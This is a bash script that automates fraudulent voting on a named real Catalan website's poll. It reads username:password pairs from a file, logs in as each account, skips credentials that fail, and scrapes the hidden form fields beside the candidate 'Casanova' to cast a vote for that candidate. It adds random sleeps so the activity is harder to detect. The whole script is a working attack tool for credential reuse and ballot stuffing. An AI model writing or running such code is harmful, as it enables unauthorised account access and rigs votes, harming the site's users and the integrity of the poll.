#!/bin/bash

sleep "$(echo $RANDOM | grep -Eo ^[0-9][0-9])m"

DIRNAME="$(dirname $0)"

OLD_IFS="${IFS}"
IFS="
"
for KEYPAR in $(cat "${DIRNAME}/passwords.txt" | shuf);
do
    USERNAME="$(echo "$KEYPAR" | cut -f1 -d:)"
    PASSWORD="$(echo "$KEYPAR" | cut -f2- -d:)"
    TIMESTAMP="$(date +%s)"

    curl -X POST -F "RL_username=${USERNAME}" -F "RL_password=${PASSWORD}" -c "${USERNAME}.${TIMESTAMP}" http://ripollesliders.cat/ > "LOGIN.${TIMESTAMP}" 2>&1

    curl -b "${USERNAME}.${TIMESTAMP}" 'http://ripollesliders.cat/votacions.php?c=5' > "CHECK.${TIMESTAMP}" 2>/dev/null

    grep "els usuaris registrats poden afegir" "CHECK.${TIMESTAMP}" >/dev/null 2>&1

    if [ "$?" -eq 0 ];
    then
        echo "error credencials: ${KEYPAR}"
        rm -fr "${USERNAME}.${TIMESTAMP}" "CHECK.${TIMESTAMP}" "LOGIN.${TIMESTAMP}"
        continue
    fi

    curl -b "${USERNAME}.${TIMESTAMP}" 'http://ripollesliders.cat/votacions.php?c=5' 2>/dev/null | strings | grep Casanova -A 10 | sed 's/>/>\n/g' | sed -n "/<form/,/<\/form>/p" | grep input | grep hidden > "INPUT.${TIMESTAMP}"

    CURL_VOT="curl -b "${USERNAME}.${TIMESTAMP}" -X POST"
    while read -r LINE;
    do
        NAME="$(echo "$LINE" | grep -Eo 'name="[^"]*"' | cut -f2 -d\")"
        VALUE="$(echo "$LINE" | grep -Eo 'value="[^"]*"' | cut -f2 -d\")"
        CURL_VOT="${CURL_VOT} -F \"${NAME}=${VALUE}\""
    done < "INPUT.${TIMESTAMP}"

    CURL_VOT="${CURL_VOT} \"http://ripollesliders.cat/votacions.php?c=5\""

    sleep "$(echo $RANDOM | grep -Eo ^[0-9])s"

    echo $CURL_VOT | bash > "OUT.${TIMESTAMP}" 2>/dev/null

    echo "== ${USERNAME} ${TIMESTAMP} =="
    strings "OUT.${TIMESTAMP}" | grep -i "El teu vot" | sed 's/>/>\n/g' | grep -i "El teu vot"

    rm -f "INPUT.${TIMESTAMP}" "${USERNAME}.${TIMESTAMP}" "OUT.${TIMESTAMP}" "CHECK.${TIMESTAMP}" "LOGIN.${TIMESTAMP}"

    sleep "$(echo $RANDOM | grep -Eo ^[0-9])m"

done
IFS="${OLD_IFS}"

echo "FI"